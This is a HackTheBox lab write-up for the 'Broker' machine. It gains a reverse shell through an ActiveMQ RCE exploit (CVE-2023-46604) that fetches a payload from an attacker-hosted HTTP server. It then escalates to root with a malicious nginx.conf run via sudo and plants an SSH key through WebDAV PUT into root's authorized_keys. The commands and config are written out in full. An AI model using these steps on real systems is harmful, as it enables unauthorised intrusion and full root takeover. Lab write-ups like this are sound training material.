---
layout: /src/layouts/MarkdownPostLayout_HTB.astro
title: Broker HackTheBox Write-Up
author: Adrian Reategui
description: ""
image:
  url: "/images/posts/broker_bg.png"
  alt: ""
pubDate: 2025-06-14
tags:
  ["linux", "webdav", "ActiveMQ", "nginx"]
languages: []
---

## NMAP
![alt](/images/posts/broker12.webp)
## ENUMERATION
- As we can see the are multiple mentions of Apache ActiveMQ, doing a bit of a research online we found that the version is vulnerable to RCE so we donwload the [exploit](https://github.com/rootsecdev/CVE-2023-46604) from github. Once downloaded we run it sharing a python HTTP server and we also set our listener up in order to get a revershell
	```
	go run main.go -i 10.10.11.243 -p 61616 -h http://10.10.14.22:80/poc-linux.xml
	python3 -m http.server 80
	```
	![alt](/images/posts/broker3.webp)
	![alt](/images/posts/broker2.webp)
- We recevied our revershell as the user activemq
	```
	nc -nlvp 9001
	```
	![alt](/images/posts/broker.webp)
## LOCAL FLAG
![alt](/images/posts/broker11.webp)
## PRIVILEGE ESCALATION
- Our user is capable of running as any user the nginx binary
	```
	sudo -l
	```
	![alt](/images/posts/broker4.webp)
- Doing a bit of a research we founf that we're cable of craft a malicious nginx.conf file that would allows us to access root files through webdav , so we start creating our malicious file
	```nginx
		user root;
		events {
			worker_connections 1024;
		}
		http {
			server {
				listen 9001;
				root /;
				autoindex on;
				dav_methods PUT;
			}
		}
	```
	![alt](/images/posts/broker5.webp)
- With our malicious file created we then execute the binary passing the conf file to it
	```bash
	sudo -u root /usr/bin/nginx -c /tmp/nginx.conf
	```
	![alt](/images/posts/broker6.webp)
- In order to test that our malicious file has been crafter and passed properly we make a request to the victim machine through the port we specified on the file
	```bash
	curl -s -X GET http://10.10.11.243:9001
	```
	![alt](/images/posts/broker7.webp)
- We are able to list the root directory, now we are going to make use of the PUT parameter in curl in order to upload our public key to the authorized_keys file inside the root .ssh directory
	```bash
	curl -X PUT http://10.10.11.243:9001/root/.ssh/authorized_keys -d 'id_rsa.pub'
	```
	![alt](/images/posts/broker8.webp)
- Once we upload our public key we then try to connect through SSH as the user root using our own private id_rsa key 
	```bash
	ssh root@10.10.11.243 -i id_rsa
	```
	![alt](/images/posts/broker9.webp)
## ROOT FLAG
![alt](/images/posts/broker10.webp)
	